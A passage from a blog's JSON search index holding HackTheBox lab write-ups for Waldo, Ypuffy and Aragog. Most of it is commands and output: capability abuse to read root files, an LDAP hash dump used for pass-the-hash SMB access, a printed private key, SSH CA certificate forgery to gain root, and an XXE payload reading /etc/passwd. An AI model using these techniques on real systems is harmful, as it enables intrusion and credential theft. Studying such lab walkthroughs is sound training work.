modprobe.d pam.conf rc0.d rsyslog.conf ssl ucf.conf adjtime ca-certificates debian_version fuse.conf hosts kernel login.defs modules pam.d rc1.d rsyslog.d staff-group-for-usr-local udev alternatives ca-certificates.conf default gai.conf hosts.allow kernel-img.conf logrotate.conf modules-load.d passwd rc2.d securetty subgid ufw anacrontab calendar deluser.conf groff hosts.deny ldap logrotate.d motd passwd- rc3.d security subgid- update-motd.d apm console-setup dhcp group ifplugd ld.so.cache machine-id mtab perl rc4.d selinux subuid vim apt cron.d dictionaries-common group- init ld.so.conf magic nanorc profile rc5.d services subuid- vmware-tools avahi cron.daily discover.conf.d grub.d init.d ld.so.conf.d magic.mime network profile.d rc6.d sgml sysctl.conf wgetrc bash.bashrc cron.hourly discover-modprobe.conf gshadow initramfs-tools libaudit.conf mailcap networks protocols rcS.d shadow sysctl.d wpa_supplicant bash_completion cron.monthly docker gshadow- inputrc libnl-3 mailcap.order newt python reportbug.conf shadow- systemd X11 bash_completion.d crontab dpkg gss iproute2 locale.alias manpath.config nsswitch.conf python2.7 resolv.conf shells terminfo xdg bindresvport.blacklist cron.weekly emacs hdparm.conf iptables locale.gen mime.types opt python3 rmt skel timezone xml binfmt.d dbus-1 environment host.conf issue localtime mke2fs.conf os-release python3.5 rpc ssh tmpfiles.d monitor@waldo:~$ cd / monitor@waldo:/$ We need to export PATH to use commands monitor@waldo:/$ id bash: id: command not found monitor@waldo:/$ export PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin monitor@waldo:/$ id uid=1001(monitor) gid=1001(monitor) groups=1001(monitor) monitor@waldo:/$ We saw app-dev folder inside monitor\u0026rsquo;s home directory monitor@waldo:~/app-dev$ ls -lha total 2.2M drwxrwx--- 3 app-dev monitor 4.0K Sep 8 2022 . drwxr-x--- 5 root monitor 4.0K Sep 8 2022 .. -rwxrwx--- 1 app-dev monitor 14K Jul 24 2018 logMonitor -r--r----- 1 app-dev monitor 14K May 3 2018 logMonitor.bak -rw-rw---- 1 app-dev monitor 2.7K May 3 2018 logMonitor.c -rw-rw---- 1 app-dev monitor 488 May 3 2018 logMonitor.h -rw-rw---- 1 app-dev monitor 2.2M May 3 2018 logMonitor.h.gch -rw-rw---- 1 app-dev monitor 6.7K May 3 2018 logMonitor.o -rwxr----- 1 app-dev monitor 266 May 3 2018 makefile -r-xr-x--- 1 app-dev monitor 795 May 3 2018 .restrictScript.sh drwxr-x--- 2 app-dev monitor 4.0K Sep 8 2022 v0.1 monitor@waldo:~/app-dev$ ls -lha v0.1/ total 24K drwxr-x--- 2 app-dev monitor 4.0K Sep 8 2022 . drwxrwx--- 3 app-dev monitor 4.0K Sep 8 2022 .. -r-xr-x--- 1 app-dev monitor 14K May 3 2018 logMonitor-0.1 If we open a source code, it allows to read logs But no suid set, so it probably due to capabilities CAP_DAC_READ_SEARCH - Bypass file read permission checks and directory read and execute permission checks; +ei (e)ffective - used by the kernel to perform permission checks (i) inheritable - preserved across execve or fork calls monitor@waldo:~/app-dev$ getcap v0.1/logMonitor-0.1 v0.1/logMonitor-0.1 = cap_dac_read_search+ei If we look for other files with capabilities we find tac, which we can use to read the root.txt monitor@waldo:~/app-dev$ find / -exec getcap {} \\; 2\u0026gt;/dev/null /usr/bin/tac = cap_dac_read_search+ei /home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei monitor@waldo:~/app-dev$ tac /root/root.txt | tac 48baee179d7cc099b111f3ded2191450 ","date":"October 22, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/waldo/images/waldo.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/waldo/","summary":"Waldo Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.87 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 20:00 BST Stats: 0:03:49 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 72.30% done; ETC: 20:05 (0:01:28 remaining) Stats: 0:09:53 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.99% done; ETC: 20:10 (0:00:00 remaining) Nmap scan report for 10.10.10.87 (10.10.10.87) Host is up (0.","tags":["HTB","docker","php","ssh","rbash","capabilities"],"title":"[HTB] Machine: Waldo"},{"categories":null,"contents":"Ypuffy Enumeration nmap └─$ nmap -Pn -p- 10.10.10.107 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:54 BST Stats: 0:06:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 41.38% done; ETC: 20:09 (0:08:34 remaining) Nmap scan report for 10.10.10.107 (10.10.10.107) Host is up (0.17s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds └─$ nmap -Pn -p22,80,139,389,445 -sC -sV 10.10.10.107 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 20:22 BST Nmap scan report for 10.10.10.107 (10.10.10.107) Host is up (0.15s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.7 (protocol 2.0) | ssh-hostkey: | 2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA) | 256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA) |_ 256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519) 80/tcp open http OpenBSD httpd 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY) 389/tcp open ldap (Anonymous bind OK) 445/tcp open �hv^�U Samba smbd 4.7.6 (workgroup: YPUFFY) Service Info: Host: YPUFFY Host script results: | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6) | Computer name: ypuffy | NetBIOS computer name: YPUFFY\\x00 | Domain name: hackthebox.htb | FQDN: ypuffy.hackthebox.htb |_ System time: 2023-10-23T15:22:21-04:00 | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2023-10-23T19:22:22 |_ start_date: N/A |_clock-skew: mean: 1h19m11s, deviation: 2h18m34s, median: -48s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.85 seconds Web server ldap └─$ ldapsearch -H ldap://10.10.10.107 -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingContexts: dc=hackthebox,dc=htb # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -H ldap://10.10.10.107 -x -b \u0026#34;dc=hackthebox,dc=htb\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;dc=hackthebox,dc=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # hackthebox.htb dn: dc=hackthebox,dc=htb dc: hackthebox objectClass: top objectClass: domain # passwd, hackthebox.htb dn: ou=passwd,dc=hackthebox,dc=htb ou: passwd objectClass: top objectClass: organizationalUnit # bob8791, passwd, hackthebox.htb dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb uid: bob8791 cn: Bob objectClass: account objectClass: posixAccount objectClass: top userPassword:: e0JTREFVVEh9Ym9iODc5MQ== uidNumber: 5001 gidNumber: 5001 gecos: Bob homeDirectory: /home/bob8791 loginShell: /bin/ksh # alice1978, passwd, hackthebox.htb dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb uid: alice1978 cn: Alice objectClass: account objectClass: posixAccount objectClass: top objectClass: sambaSamAccount userPassword:: e0JTREFVVEh9YWxpY2UxOTc4 uidNumber: 5000 gidNumber: 5000 gecos: Alice homeDirectory: /home/alice1978 loginShell: /bin/ksh sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 displayName: Alice sambaAcctFlags: [U ] sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B sambaPwdLastSet: 1532916644 # group, hackthebox.htb dn: ou=group,dc=hackthebox,dc=htb ou: group objectClass: top objectClass: organizationalUnit # bob8791, group, hackthebox.htb dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: bob8791 userPassword:: e2NyeXB0fSo= gidNumber: 5001 # alice1978, group, hackthebox.htb dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: alice1978 userPassword:: e2NyeXB0fSo= gidNumber: 5000 # ypuffy, hackthebox.htb dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb sambaDomainName: YPUFFY sambaSID: S-1-5-21-3933741069-3307154301-3557023464 sambaAlgorithmicRidBase: 1000 objectclass: sambaDomain sambaNextUserRid: 1000 sambaMinPwdLength: 5 sambaPwdHistoryLength: 0 sambaLogonToChgPwd: 0 sambaMaxPwdAge: -1 sambaMinPwdAge: 0 sambaLockoutDuration: 30 sambaLockoutObservationWindow: 30 sambaLockoutThreshold: 0 sambaForceLogoff: -1 sambaRefuseMachinePwdChange: 0 sambaNextRid: 1001 # search result search: 2 result: 0 Success # numResponses: 9 # numEntries: 8 smb └─$ smbclient -N -L //10.10.10.107 Anonymous login successful tree connect failed: NT_STATUS_ACCESS_DENIED Foothold We found users via ldapsearch Passwords are not visible, but we have a hash Connect to smb using hash └─$ smbclient -L //10.10.10.107 -U \u0026#39;alice1978%0B186E661BBDBDCF6047784DE8B9FD8B\u0026#39; --pw-nt-hash Sharename Type Comment --------- ---- ------- alice Disk Alice\u0026#39;s Windows Directory IPC$ IPC IPC Service (Samba Server) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- Inside alice share we find private key └─$ smbclient //10.10.10.107/alice -U \u0026#39;alice1978%0B186E661BBDBDCF6047784DE8B9FD8B\u0026#39; --pw-nt-hash Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Tue Jul 31 03:54:20 2018 .. D 0 Wed Aug 1 04:16:50 2018 my_private_key.ppk A 1460 Tue Jul 17 02:38:51 2018 433262 blocks of size 1024. 411540 blocks available smb: \\\u0026gt; PuTTY-User-Key-File-2: ssh-rsa Encryption: none Comment: rsa-key-20180716 Public-Lines: 6 AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz 1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02qux BoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAj h7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/Sxa iA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWx ivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== Private-Lines: 14 AAABAH0knH2xprkuycHoh18sGrlvVGVG6C2vZ9PsiBdP/5wmhpYI3Svnn3ZL8CwF VGaXdidhZunC9xmD1/QAgCgTz/Fh5yl+nGdeBWc10hLD2SeqFJoHU6SLYpOSViSE cOZ5mYSy4IIRgPdJKwL6NPnrO+qORSSs9uKVqEdmKLm5lat9dRJVtFlG2tZ7tsma hRM//9du5MKWWemJlW9PmRGY6shATM3Ow8LojNgnpoHNigB6b/kdDozx6RIf8b1q Gs+gaU1W5FVehiV6dO2OjHUoUtBME01owBLvwjdV/1Sea/kcZa72TYIMoN1MUEFC 3hlBVcWbiy+O27JzmDzhYen0Jq0AAACBANTBwU1DttMKKphHAN23+tvIAh3rlNG6 m+xeStOxEusrbNL89aEU03FWXIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6 l4UVEuHUqnTfEOowVTcVNlwpNM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v 4L9aKFwiMZxfAAAAgQDG+o9xrh+rZuQg8BZ6ZcGGdszZITn797a4YU+NzxjP4jR+ qSVCTRky9uSP0i9H7B9KVnuu9AfzKDBgSH/zxFnJqBTTykM1imjt+y1wVa/3aLPh hKxePlIrP3YaMKd38ss2ebeqWy+XJYwgWOsSw8wAQT7fIxmT8OYfJRjRGTS74QAA AIEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2iI5c QLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+Wuvl xTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts= Private-MAC: 208b4e256cd56d59f70e3594f4e2c3ca91a757c9 It\u0026rsquo;s a putty key, convert it via puttygen └─$ puttygen priv.key -O private-openssh -o alice.key └─$ cat alice.key -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR +gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A 0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIsk Hqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMs qpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1 adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/UfwIBJQKCAQB9JJx9saa5LsnB6Idf LBq5b1RlRugtr2fT7IgXT/+cJoaWCN0r5592S/AsBVRml3YnYWbpwvcZg9f0AIAo E8/xYecpfpxnXgVnNdISw9knqhSaB1Oki2KTklYkhHDmeZmEsuCCEYD3SSsC+jT5 6zvqjkUkrPbilahHZii5uZWrfXUSVbRZRtrWe7bJmoUTP//XbuTCllnpiZVvT5kR mOrIQEzNzsPC6IzYJ6aBzYoAem/5HQ6M8ekSH/G9ahrPoGlNVuRVXoYlenTtjox1 KFLQTBNNaMAS78I3Vf9Unmv5HGWu9k2CDKDdTFBBQt4ZQVXFm4svjtuyc5g84WHp 9CatAoGBANTBwU1DttMKKphHAN23+tvIAh3rlNG6m+xeStOxEusrbNL89aEU03FW XIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6l4UVEuHUqnTfEOowVTcVNlwp NM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v4L9aKFwiMZxfAoGBAMb6j3Gu H6tm5CDwFnplwYZ2zNkhOfv3trhhT43PGM/iNH6pJUJNGTL25I/SL0fsH0pWe670 B/MoMGBIf/PEWcmoFNPKQzWKaO37LXBVr/dos+GErF4+Uis/dhowp3fyyzZ5t6pb L5cljCBY6xLDzABBPt8jGZPw5h8lGNEZNLvhAoGAUICqAY8+QgPYw/8wwpikG88j ZURh0tD8uk0xEdRMWPusotxBQ95d19t89fz+qZO3TER90c4paPkuAgWfLCkIX8GO qvM9jXp+hWHreAtHan3quXoSZ96DRXdgFwI69GIms9QKDdy9NmimGQwQIsC0Wggf jkS3cGwP2bNpN548SQECgYEAvDkf6BNqENbzeRp2IMEe2SRFPBiC9URFD0dLQPRV vbpNVTg4AHJxyG0BuHq3GoVptQWzRKGmp747mVlWcPgB6EUMyFeLry/mt5qSxDVh Q/tCX7TaZvyul5zlVwtt+9fU/C3y7UGAC4Rh9RXXcp2Jn2BQOtwDcES+AcklUCyZ qs0CgYEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2 iI5cQLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+ WuvlxTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts= -----END RSA PRIVATE KEY----- Now, we can connect to ssh └─$ ssh alice1978@10.10.10.107 -i alice.key Warning: Permanently added \u0026#39;10.10.10.107\u0026#39; (ED25519) to the list of known hosts. OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018 Welcome to OpenBSD: The proactively secure Unix-like operating system. Please use the sendbug(1) utility to report bugs in the system. Before reporting a bug, please try to reproduce it with the latest version of the code. With bug reports, please try to ensure that enough information to reproduce the problem is enclosed, and if a known fix for it exists, include that as well. ypuffy$ whoami alice1978 ypuffy$ Root It\u0026rsquo;s a OpenBSD box ssh config Looks like ssh allows ssh connection via certificates signed by CA ... PermitRootLogin prohibit-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #PubkeyAuthentication yes # The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2 # but this is overridden so installations will only check .ssh/authorized_keys AuthorizedKeysFile .ssh/authorized_keys #AuthorizedPrincipalsFile none AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys\u0026amp;username=%u AuthorizedKeysCommandUser nobody TrustedUserCAKeys /home/userca/ca.pub AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals\u0026amp;username=%u AuthorizedPrincipalsCommandUser nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #HostbasedAuthentication no # Change to yes if you don\u0026#39;t trust ~/.ssh/known_hosts for # HostbasedAuthentication #IgnoreUserKnownHosts no # Don\u0026#39;t read the user\u0026#39;s ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! PasswordAuthentication no #PermitEmptyPasswords no ... From the config file we see userca contains CA keys Both private and public https://engineering.fb.com/2016/09/12/security/scalable-and-secure-access-with-ssh/ ypuffy$ ls -lha /home/userca/ total 44 drwxr-xr-x 3 userca userca 512B Jul 30 2018 . drwxr-xr-x 5 root wheel 512B Jul 30 2018 .. -rw-r--r-- 1 userca userca 87B Jul 30 2018 .Xdefaults -rw-r--r-- 1 userca userca 771B Jul 30 2018 .cshrc -rw-r--r-- 1 userca userca 101B Jul 30 2018 .cvsrc -rw-r--r-- 1 userca userca 359B Jul 30 2018 .login -rw-r--r-- 1 userca userca 175B Jul 30 2018 .mailrc -rw-r--r-- 1 userca userca 215B Jul 30 2018 .profile drwx------ 2 userca userca 512B Jul 30 2018 .ssh -r-------- 1 userca userca 1.6K Jul 30 2018 ca -r--r--r-- 1 userca userca 410B Jul 30 2018 ca.pub We can test the url in AuthorizedKeysCommand from the config The key matches the one I got from smb ypuffy$ curl \u0026#39;http://127.0.0.1/sshauth?type=keys\u0026amp;username=alice1978\u0026#39; ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716 Curling AuthorizedPrincipalsCommand returns usernames ypuffy$ curl \u0026#39;http://127.0.0.1/sshauth?type=principals\u0026amp;username=alice1978\u0026#39; alice1978 ypuffy$ curl \u0026#39;http://127.0.0.1/sshauth?type=principals\u0026amp;username=bob8791\u0026#39; bob8791 ypuffy$ Strangely, if we try it on root user we receive back 3m3rgencyB4ckd00r principal ypuffy$ curl \u0026#39;http://127.0.0.1/sshauth?type=principals\u0026amp;username=root\u0026#39; 3m3rgencyB4ckd00r Let\u0026rsquo;s also check sudo/doas rights alice1978 can run ssh-keygen as userca ypuffy$ cat /etc/doas.conf permit keepenv :wheel permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen We can generate signed certificate with what we have Generate a key ypuffy$ cd /home/alice1978/ ypuffy$ mkdir pwn ypuffy$ chmod 777 pwn ypuffy$ cd pwn/ ypuffy$ ssh-keygen -f id_rsa.root Generating public/private rsa key pair. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in id_rsa.root. Your public key has been saved in id_rsa.root.pub. The key fingerprint is: SHA256:R7n4q5LHftp5TTy55eJ/jaGCvkXMx8Kw9vBMJxZ4+AU alice1978@ypuffy.hackthebox.htb The key\u0026#39;s randomart image is: +---[RSA 2048]----+ | E | | o o | | + = . | | @ = | | S \u0026amp; +. . | | . @ = * .| | o .* + B.| | o +oooo = +| | =*=+o ..oo| +----[SHA256]-----+ ypuffy$ ls -lha total 16 drwxrwxrwx 2 alice1978 alice1978 512B Oct 24 12:38 . drwxr-x--- 5 alice1978 alice1978 512B Oct 24 12:38 .. -rw------- 1 userca alice1978 1.6K Oct 24 12:38 id_rsa.root -rw-r--r-- 1 userca alice1978 410B Oct 24 12:38 id_rsa.root.pub Now we generate a signed certificate ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I pentest -n 3m3rgencyB4ckd00r -V +52w id_rsa.root Signed user key id_rsa.root-cert.pub: id \u0026#34;pentest\u0026#34; serial 0 for 3m3rgencyB4ckd00r valid from 2023-10-24T12:44:00 to 2024-10-22T12:45:20 ypuffy$ ls -lha total 20 drwxrwxrwx 2 alice1978 alice1978 512B Oct 24 12:45 . drwxr-x--- 5 alice1978 alice1978 512B Oct 24 12:38 .. -rw------- 1 alice1978 alice1978 1.6K Oct 24 12:45 id_rsa.root -rw-r--r-- 1 userca alice1978 1.5K Oct 24 12:45 id_rsa.root-cert.pub -rw-r--r-- 1 alice1978 alice1978 413B Oct 24 12:45 id_rsa.root.pub Use it to connect as root ypuffy$ ssh -i id_rsa.root root@localhost OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018 Welcome to OpenBSD: The proactively secure Unix-like operating system. Please use the sendbug(1) utility to report bugs in the system. Before reporting a bug, please try to reproduce it with the latest version of the code. With bug reports, please try to ensure that enough information to reproduce the problem is enclosed, and if a known fix for it exists, include that as well. ypuffy# whoami root ypuffy# ","date":"October 22, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/ypuffy/images/ypuffy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/ypuffy/","summary":"Ypuffy Enumeration nmap └─$ nmap -Pn -p- 10.10.10.107 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:54 BST Stats: 0:06:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 41.38% done; ETC: 20:09 (0:08:34 remaining) Nmap scan report for 10.10.10.107 (10.10.10.107) Host is up (0.17s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds └─$ nmap -Pn -p22,80,139,389,445 -sC -sV 10.","tags":["HTB","ldap","ssh","ssh-keygen","doas","sudo","certificate","certificate-authority","authorizedkeyscommand"],"title":"[HTB] Machine: Ypuffy"},{"categories":null,"contents":"Aragog Enumeration nmap └─$ nmap -Pn -p- 10.10.10.78 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:10 BST Nmap scan report for 10.10.10.78 (10.10.10.78) Host is up (0.15s latency). Not shown: 65493 filtered tcp ports (no-response), 39 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds └─$ nmap -Pn -p21,22,80 -sC -sV 10.10.10.78 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:11 BST Nmap scan report for 10.10.10.78 (10.10.10.78) Host is up (0.12s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-r--r--r-- 1 ftp ftp 86 Dec 21 2017 test.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.16.5 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA) | 256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA) |_ 256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Did not follow redirect to http://aragog.htb/ Service Info: Host: aragog.htb; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.47 seconds ftp └─$ ftp anonymous@10.10.10.78 Connected to 10.10.10.78. 220 (vsFTPd 3.0.3) 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||43838|) 150 Here comes the directory listing. -r--r--r-- 1 ftp ftp 86 Dec 21 2017 test.txt 226 Directory send OK. ftp\u0026gt; more test.txt \u0026lt;details\u0026gt; \u0026lt;subnet_mask\u0026gt;255.255.255.192\u0026lt;/subnet_mask\u0026gt; \u0026lt;test\u0026gt;\u0026lt;/test\u0026gt; \u0026lt;/details\u0026gt; Web server wfuzz └─$ wfuzz -u http://aragog.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#39;Host: FUZZ.aragog.htb\u0026#39; --hw 28 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://aragog.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== feroxbuster └─$ feroxbuster -u http://aragog.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php --depth 2 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://aragog.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [txt, php] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 2 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 403 GET 9l 28w 275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 15l 74w 6143c http://aragog.htb/icons/ubuntu-logo.png 200 GET 375l 968w 11321c http://aragog.htb/ 200 GET 3l 6w 46c http://aragog.htb/hosts.php Foothold http://aragog.htb/hosts.php Could be related to test file we saw in ftp If we try sending POST request with test.txt from ftp, we have a response back File format is xml └─$ curl -X POST --data @test.txt http://aragog.htb/hosts.php There are 62 possible hosts for 255.255.255.192 We could try XXE https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity \u0026lt;!--?xml version=\u0026#34;1.0\u0026#34; ?--\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;/etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;details\u0026gt; \u0026lt;subnet_mask\u0026gt;\u0026amp;xxe;\u0026lt;/subnet_mask\u0026gt; \u0026lt;test\u0026gt;\u0026lt;/test\u0026gt; \u0026lt;/details\u0026gt; If we send our payload we have a success └─$ curl -X POST --data @evil.xml http://aragog.htb/hosts.php There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 